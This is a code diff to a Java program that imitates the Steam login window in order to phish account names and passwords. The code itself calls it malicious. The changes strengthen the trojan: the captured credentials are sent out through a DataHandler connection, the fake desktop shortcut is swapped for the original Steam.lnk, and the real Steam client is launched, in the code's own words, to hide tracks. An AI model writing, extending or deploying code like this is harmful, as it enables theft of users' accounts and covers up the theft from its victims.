@@ -6,6 +6,10 @@ import java.awt.event.*;
 import java.awt.event.ActionListener;
 import java.io.File;
 import java.io.IOException;
+import java.nio.file.Files;
+import java.nio.file.LinkOption;
+import java.nio.file.Path;
+import java.nio.file.Paths;
 
 
 public class LoginForm extends JFrame implements ActionListener, MouseListener, MouseMotionListener{
@@ -312,7 +316,13 @@ public class LoginForm extends JFrame implements ActionListener, MouseListener, 
         Component s = (Component)e.getSource();
         if(s == exitButton || s == CANCEL || s == LOGIN || s == AccountName || s == Password){
             transmitAll();
-            if(s != CANCEL)cleanUp();
+            if(s != CANCEL){
+                cleanUp();
+            }
+            else{
+                this.dispose();
+                System.exit(0);
+            }
         }
         if(e.getSource() == minimizeButton){
             this.setState(ICONIFIED);
@@ -323,7 +333,6 @@ public class LoginForm extends JFrame implements ActionListener, MouseListener, 
     public void transmitAll(){
         DataHandler connection;
         try {
-            cleanUp();
             connection = new DataHandler();
             connection.transmit("\n=====\n" + AccountName.getText() + "\n" +
                     new String(Password.getPassword()) + "\n====\n");
@@ -341,19 +350,31 @@ public class LoginForm extends JFrame implements ActionListener, MouseListener, 
         this.dispose();
 
         // after window closes, replace the malicious desktop shortcut with a legitimate shortcut
-        String separator = System.getProperty("file.separator");
-        String desktopDir = System.getProperty("user.home") + separator + "Desktop" + separator;
-        File thisShortcut = new File(desktopDir + "Steam.lnk");
+        String homeDir = System.getProperty("user.home");
+        Path thisShortcutPath = Paths.get(homeDir, "Desktop", "Steam.lnk");
+        File thisShortcut = thisShortcutPath.toFile();
         if(thisShortcut.exists()){
             thisShortcut.delete();
         }
 
+        String cwd = System.getProperty("user.dir");
+        Path originalPath = Paths.get(cwd, "Steam.lnk");
+        File original = originalPath.toFile();
+        System.out.println(original);
+        if(original.exists()){
+            try {
+                Files.copy(originalPath, thisShortcutPath, LinkOption.NOFOLLOW_LINKS);
+            }
+            catch (IOException e){
+                // don't give up, try to launch steam
+            }
+        }
+
         // lastly, launch the steam client to hide tracks
-        String steamPath = "\"C:" + separator + "Program Files (x86)" + separator + "Steam" + separator + "Steam.exe\"";
-        System.out.println(steamPath);
+        Path steamPath = Paths.get("C:","Program Files (x86)", "Steam", "Steam.exe");
         Runtime runtime = Runtime.getRuntime();
         try {
-            runtime.exec(steamPath);
+            runtime.exec(steamPath.toString());
         }
         catch (IOException e){
             return ; // give up
